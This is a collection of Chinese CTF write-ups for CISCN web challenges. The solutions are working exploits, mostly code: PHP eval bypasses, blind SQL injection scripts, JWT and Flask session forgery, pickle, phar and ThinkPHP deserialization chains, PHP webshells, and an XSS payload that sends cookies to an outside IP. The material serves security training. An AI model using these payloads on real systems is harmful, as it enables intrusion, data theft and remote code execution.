## [CISCN 2019 初赛]Love Math



打开题目，直接给了源码

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\ [', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

### 初试

又有黑名单，又有白名单，字母只能是白名单里且按顺序连接出现，这题贴心的给了网站简单介绍了给个数学函数
发现一个有趣的
![image-20220731221722003](D:\Typora\note\CTF\web\ciscn.assets\image-20220731221722003.png)

任意进制意味着，你拥有了任何**小写**字母，而字符串加括号会把字符串当函数执行，括号是没有绕过的，可以先试试phpinfo

```php
?c=base_convert(55490343972,10,36)()
```

成功回显phpinfo

但是只有小写，而且很多特殊符号都被过滤了(特别是单引号)，显然是不行的，这个时候就需要用别的输入来绕过一下过滤了
得到了所有字母，就有了**hex2bin**
开始想着就通过**base_convert**来构造**hex2bin**，然后再用**bin2hex**将想输入的字符串转为十六进制，而十六进制有字母，再把16进制的字符通过36进制转为十进制，再用**base_convert**转为刚刚的十六进制从而实现rce，而且我成功在本地环境回显了(😴😴)![image-20220731224003384](D:\Typora\note\CTF\web\ciscn.assets\image-20220731224003384.png)

### 转换思路

但是题目是残酷的，有限制长度，我这已经爆爆爆长了
所以只能换个思路，再在能用的函数里面找找可以进制转换的，但是只能是几进制转换为十六进制的，不然基本没用
直接搜**hex**，找到一个**dechex**，十进制转换为十六进制的，符合需求

接下来就是构造，我构造出了一个

```php
base_convert(37907361743,10,36)(dechex(2620891871246496093))()$1=phpinfo

echo base_convert(37907361743,10,36)(dechex(2620891871246496093));
// $_GET[1]

但是报错
Fatal error: Uncaught Error: Call to undefined function $_GET[1]() in E:\phpstudy_pro\WWW\test\1.php(3) : eval()'d code:1 Stack trace: #0 E:\phpstudy_pro\WWW\test\1.php(3): eval() #1 {main} thrown in E:\phpstudy_pro\WWW\test\1.php(3) : eval()'d code on line 1
```

显然这样是不行的 /list
又要换个思路，就想到了之前这种转了字符之后貌似不是这样用的，而是用把一个值当作这个字符，这里就把`$_GET[1]换成$_GET`
然后令**$abs=$_GET**，这时`$abs[1]();&1=phpinfo`才能正常执行
经本地测试

```php
?c=$a=$_GET;$a[1]();&1=phpinfo
    成功回显
?c=$a=base_convert(37907361743,10,36)(dechex(156217328980));$a[1]();&1=phpinfo
    报错
然后本地试了之后，第一个的$a是被当成数组了,等同$_GET,而第二个只是字符串,这就不行了
```

那我该怎么写？？？

### 最后

想到了平常变量覆盖会用到的思想

```
如果让$a=_GET  那 $$a=$_GET  那$$a[1]=$_GET[1]啦??
```

![image-20220731234148155](D:\Typora\note\CTF\web\ciscn.assets\image-20220731234148155.png)

成功回显！！！！！！！~(芜湖🤪)
然后在php8之前，大括号是可以用中括号代替的，这也就是为什么我本地(php8)试不行(php7)试可以的原因
最终的payload

```php
?c=$abs=base_convert(37907361743,10,36)(dechex(1598506324));$$abs{1}($$abs{2});&1=system&2=cat%20/flag
```

这题质量太高了，将很多php知识综合，确实确实很难了，值得回味



## [CISCN2019 华北赛区 Day2 Web1]Hack World



![image-20220724162707744](D:\Typora\note\CTF\web\ciscn.assets\image-20220724162707744.png)

随意fuzz一下，发现过滤了很多很多东西
`单双引号，||，&，分号，union，#基本扼杀了所有拼接查询的路`
所以就只能用一种不需要拼接的办法

#### 第一种

异或
`1^1=0  1^1^1=1`
payload:`1^(ascii(substr((select(flag)from(flag)),1,1))=102)^1`
脚本

```py
import requests
import time

url='http://ce2d5a60-c4be-4088-87f8-7419722a4e48.node4.buuoj.cn:81/index.php'
str='0123456789qwertyuiopasdfghjklzxcvbnm}-'
flag=''
for i in range(1,100):
    for j in range(32,128):
        data={"id":f"1^(ascii(substr((select(flag)from(flag)),{i},1))={j})^1"}
        r=requests.post(url=url,data=data)
        time.sleep(0.1) #buu对访问速度有限制，需要慢一点
        #print(data)
        if("Hello, glzjin wants a girlfriend."in r.text):
            flag+=chr(j)
            print(flag)
            if chr(j)=='}':
                exit()
            break
```

#### 第二种

实际上类似第一种，不过更好理解

payload: `if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)`
if成立则返回1，反之则是0

脚本就上面稍微改改就好



## [CISCN2019 华东南赛区]Web11



![image-20220807224733801](D:\Typora\note\CTF\web\ciscn.assets\image-20220807224733801.png)

高大上的界面，和之前一题ip很像，但就是一个很简单很简单的SSTL
完全无故过滤，直接传XFF得到flag



## [CISCN2019 华北赛区 Day1 Web2]ikun

<font color='pink'>做ciscn的题真的可以学到很多</font>

### 考点

py脚本，jwt伪造，py反序列化

### 购买lv6账号

![image-20220812142949212](D:\Typora\note\CTF\web\ciscn.assets\image-20220812142949212.png)

一开始是在这个页面，通过py改最上面的数字来找到lv6，但是这个页面购买没有优惠，无法买到lv6
`http://3c5a49e2-56fc-4328-96fa-330f067ee634.node4.buuoj.cn:81/shop?page=2`
只能通过这样的方法来找lv6

```py
import requests
import time

a='[+]running:'
for i in range(1,1000):
    url=f'http://3c5a49e2-56fc-4328-96fa-330f067ee634.node4.buuoj.cn:81/shop?page={i}'
    r=requests.get(url)
    time.sleep(0.04)
    if'lv6.png'in r.text:
        print('[+]done:'+url)
        break
    else:
        print(a+url)


[+]done:http://3c5a49e2-56fc-4328-96fa-330f067ee634.node4.buuoj.cn:81/shop?page=180
```

HackBar抓包改折扣

```
POST _xsrf=2%7Ca3bbe903%7Cc7e7316d86e9dba91a750c9e5b809b35%7C1660274976&discount=0.00000000000000000000001&id=1624&price=1145141919.0
```

### JWT伪造

然后进入**/b1g_m4mber**目录，提示只有admin才能访问
看cookie里面有**JWT**，很明显是**JWT伪造**

```sh
xiaolei@xl-pc:~/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEnb3IgMT0xOyMifQ.2KZFeYNbr1BXQlGVWO33po-cY_t0Qi3ulU3sArr_T1g
Secret is "1Kun"
```

用工具破出密钥
在[jwt](https://jwt.io/)解码网站将用户名改为admin![image-20220812143511736](D:\Typora\note\CTF\web\ciscn.assets\image-20220812143511736.png)

更改cookie，成功访问**/b1g_m4mber**，在源码里面看到题目的源码，下载源码

### py反序列化



py现在只会写个脚本，反序列化还是完全不会，就先贴个脚本

```py
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

```

<font color='red'>**注：在python2的环境下运行**</font>

```sh
xiaolei@xl-pc:/ctf/web/buu/exp$ python2 ikun.py
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

将源码**become**的hidden删掉，生成的值输进去得到flag



## [CISCN 2022 初赛]ezpop



www.zip源码泄露，找到路由和反序列化入口，然后拿链子打就好了

**rce**

```php
<?php

namespace think\model\concern;

trait Attribute
{
    private $data = ["key" => ["key1" => "cat /nssctfflag"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));
```

**write_file**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-27 15:32:51
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-31 20:16:32
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

namespace League\Flysystem\Adapter;

class Local{

}

namespace League\Flysystem\Cached\Storage;

use League\Flysystem\Adapter\local;

class Adapter{
	protected $adapter;
	protected $file;
	protected $cache = [];
	protected $autosave;

	public function __construct(){
		$this->adapter=new Local();
		$this->autosave=false;
		$this->file="1.php";
		array_push($this->cache, '<?php $a=$_POST[1];eval($a);?>');
	}

}


$adapter = new Adapter();


echo urlencode(serialize($adapter));

```



## [CISCN2019 华北赛区 Day1 Web1]Dropbox



### 目录穿越

经典的注册和登陆框，先注册个号登陆看看功能
进去有个**上传、删除和下载**
很明显有一个任意目录读取的漏洞
读出来六个文件**class.php**,**delete.php**,**download.php**,**index.php**,**login.php**,**upload.php**
我这就只放出最核心的class.php了

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>

```

### phar反序列化

很直接的可以看到两个危险函数
`unlink & file_get_contents`结合文件上传,自然而然的想到phar反序列化

而upload只做了很简单的**type**格式文件过滤，然后把上传的文件都按**type**分配后缀，丝毫不影响phar反序列化
(然后有个傻子上传文件被校园网拦截了卡了半天找不到原因😅，这就是电带网安吗)

反序列化入口有了，接下来找链子就好了

### POP链

在download里面文件名有对flag的过滤，所以flag应该在常见位置(最后试出在根目录的flag.txt)
入口有两个，但是delete是直接以后端形式回显，而download是下载文件的形式，很明显只有delete这个可以被利用

#### 入出口

所以入口一定是
**unlink**
接下来找出口，单独的**file_get_contents**是没有回显的，所以要找一个输出函数
唯一看到的就是**FileList**的**__destruct**中有echo
所以出口一定是
**FileList=>__destruct=>echo $table**(因为**file_get_contents**前面是有个return的，所以可行)

#### 触发

接下来就是看怎么将**file_get_contents**的内容给到**echo**

本来触发**File**的**close()**在反序列化中是不现实的，但是**User**里面的**__destruct**竟然调用了一个同名函数！！

```php
public function __destruct() {
    $this->db->close();
}
```

db可控，那么调用就可控

而现在还需要**FileList**，并且需要在**FileList**中调用到**File**的**close()**，也很难实现吧，然后（（（
**FileList**中的**__call**方法完美的实现了

```php
public function __call($func, $args) {
    array_push($this->funcs, $func);
    foreach ($this->files as $file) {
        $this->results[$file->name()][$func] = $file->$func();
    }
}
```

并且正正好好的把return的值存下来了👍(题目太巧妙了)

而且在**__destruct**又又又正好的把上一步存下来的值存进了**$table**

```php
foreach ($this->results as $filename => $result) {
    $table .= '<tr>';
    foreach ($result as $func => $value) {
        $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
    }
    $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
    $table .= '</tr>';
}
```

这一步用两个**foreach**把二元数组**result**的值遍历存进了**$table**，最后echo完美的构造了链子

#### 总结

所以链子就是

```ABAP
delete->File->unlink
User->__destruct
FileList->__call [触发File->close()] ->__destruct
```

#### exp

```php
<?php
    class User {
    	public $db;
    }
    class File {
    	public $filename;
    }
    class FileList {
        private $files;
        private $results;
        private $funcs;
        public function __construct() {
            $this->files = array();
            $this->results = array();
            $this->funcs = array();
            
            $file = new File();
            $file->filename = '/flag.txt';	# 这里的flag.txt是多次猜测出来的
            array_push($this->files, $file);
    	}
    }

    $user = new User();
	$filelist = new FileList();
	$user->db = $filelist;

    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");  //设置stub，增加png文件头
    $phar->setMetadata($user); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

<font color='whiblue'>**太太太棒了😍😍**</font>



## [CISCN2019 华东北赛区]Web2

因为buu上面的不出网，只能用它的xss平台，而我又一直注册不了，就自己拉**docker**建了一下

![image-20221220121846207](ciscn.assets/image-20221220121846207.png)

可以注册，投稿，然后将投稿的页面反馈给管理员（通过扫后台，扫到**admin.php**，很明显就是要xss拿cookie了

简单fuzz可知，`= ' " ()`都被过滤了，可以利用编码绕过

```python
in_str = "window.location.href='http://1.15.107.150:3296?c='+document.cookie"
output = ""
for c in in_str:
    output += "&#" + str(ord(c))
print("<svg><script>" + output + "</script>")
```

必须要在最前面加上`<svg>`标签才行

![image-20221220122409916](ciscn.assets/image-20221220122409916.png)

弹到**cookie**，访问**admin.php**

然后就是无任何过滤的sql注入

![image-20221220122655359](ciscn.assets/image-20221220122655359.png)

## [CISCN2019 华北赛区 Day1 Web5]CyberPunk

不知道为什么buu的环境查看文件会报错。。

查看源代码发现`?file=`，然后利用查看各种文件（也没看到，就不放了）发现只有address这里没有过滤

那就是一个简单的二次注入了

最终payload

```sql
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,200)),0x7e),1)#
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,200)),0x7e),1)#
//有长度限制
//flag{ccebab39-c01d-460d-b166-b8a6eecd8427}
```

## [CISCN2019 总决赛 Day2 Web1]Easyweb

有个image.php里面有id参数，试了一下得到`image.php.bak`

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

> **addslashes**
>
> 在单引号（`'`）、双引号（`"`）、反斜线（`\`）与    NUL（**`null`** 字符）前加上反斜线

在后面也用了`str_replace`来过滤危险字符

直接在本地测试一下

![image-20221225133721321](ciscn.assets/image-20221225133721321.png)

可以逃逸出去反斜杠

于是构造payload

```sql
image.php?id=\0&path=||1=1;%23
select * from images where id='\' or path='||1=1;#'
```

成功回显图片

> **mysqli_fetch_array**
>
> 返回一个以列名为key的数组
>
> ```sql
> mysql> select * from admin;
> +----+----------+------------+
> | id | username | account    |
> +----+----------+------------+
> |  1 | xlccccc  | 2595251998 |
> +----+----------+------------+
> 1 row in set (0.00 sec)
> ```
>
> 返回的数组就是`row['id']==>1 row['username']==>xlccccc`

想试着逃逸出双引号来直接读文件，没试成功，那就只能盲注了

```python
import requests
import time

url = 'http://5376ddf5-a7d0-45d6-aaf3-c01fdf510cb3.node4.buuoj.cn:81/image.php'
database = ''
flag = ''
str = '0123456789qwertyuiopasdfghjklzxcvbnm}-'
# table: images users
payload1 = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# column: user,password
payload2 = "select group_concat(column_name) from information_schema.columns where table_name=0x7573657273"
# password:953cb63f6d5d78d0cffb
payload3 = "select group_concat(password) from users"
for i in range(1, 46):
  for j in range(32, 127):
    payload=rf"?id=\0&path=||ascii(substr(({payload3}),{i},1))={j};%23"
    time.sleep(0.1)
    r = requests.get(url+payload)
    if r.text != '':
      flag += chr(j)
      print("[+]:"+flag)
```

`admin 953cb63f6d5d78d0cffb`登陆后有个上传文件功能

有一个上传文件的功能，文件名会被放在`log.php`里面，使用短标签绕过过滤传一句话木马`<?=@eval($_POST['a']);?>`

rce得到flag

## [CISCN2019 华东南赛区]Web4

打开发现

![image-20230104163835289](ciscn.assets/image-20230104163835289.png)

传`http://127.0.0.1`没有回显，不像ssrf，直接传`/etc/hosts`回显了文件

读 **/prof/self/cmdline**

```
/usr/local/bin/python/app/app.py
```

读**app.py**

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

以**uuid**为种进行`random.random()*233`来作为`SECRET_KEY`

读取`/sys/class/net/eth0/address`

```
ba:c7:01:40:48:65
转为十进制
205363882248293
```

利用**python2**来生成密钥

```bash
xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python2
Python 2.7.18 (default, Jul  1 2022, 12:27:04)
[GCC 9.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import re, random, uuid, urllib
>>> from flask import Flask, session, request
>>> app = Flask(__name__)
>>> random.seed(205363882248293)
>>> app.config['SECRET_KEY'] = str(random.random()*233)
>>> print app.config['SECRET_KEY']
134.19035408
```

伪造**session**

```bash
xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y7U6ZQ.GUlT9ao2Nb5hy5J8u-kFvgv4JY0" -s "134.19035408"
{'username': b'www-data'}
xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py encode -t "{'username': b'fuck'}" -s "134.19035408"                                                              eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Y7U9-w.k_ugK1drBaWwd4Po3Xl3XpgraV4
```

